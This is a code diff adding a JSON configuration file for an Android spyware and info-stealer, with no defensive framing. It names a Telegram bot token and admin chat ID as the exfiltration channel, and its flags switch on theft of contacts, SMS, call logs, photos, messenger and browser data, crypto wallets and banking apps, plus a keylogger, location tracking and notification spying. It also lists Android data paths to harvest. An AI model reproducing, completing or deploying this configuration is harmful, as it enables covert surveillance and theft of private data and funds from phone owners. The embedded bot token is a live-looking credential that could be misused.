@@ -1,0 +1,41 @@
+{
+  "telegram_bot_token": "8364189800:AAHHsHHgKZ7oB6XSHExPWn0-0G5Fp8fGNi4",
+  "admin_chat_id": 7725796090,
+  "features": {
+    "steal_contacts": true,
+    "steal_sms": true,
+    "steal_call_logs": true,
+    "steal_gallery": true,
+    "steal_documents": true,
+    "steal_telegram": true,
+    "steal_whatsapp": true,
+    "steal_instagram": true,
+    "steal_vk": true,
+    "steal_facebook": true,
+    "steal_chrome": true,
+    "steal_firefox": true,
+    "steal_trustwallet": true,
+    "steal_metamask": true,
+    "steal_binance": true,
+    "steal_exodus": true,
+    "steal_tinkoff": true,
+    "steal_sberbank": true,
+    "keylogger": true,
+    "location": true,
+    "microphone": false,
+    "screenshot": false,
+    "notification_spy": true
+  },
+  "paths": {
+    "telegram_path": "/data/data/org.telegram.messenger/files/",
+    "whatsapp_path": "/data/data/com.whatsapp/",
+    "chrome_path": "/data/data/com.android.chrome/app_chrome/Default/",
+    "downloads_path": "/storage/emulated/0/Download/",
+    "dcim_path": "/storage/emulated/0/DCIM/"
+  },
+  "exfiltration": {
+    "method": "telegram",
+    "encrypt": false,
+    "chunk_size": 4096
+  }
+}
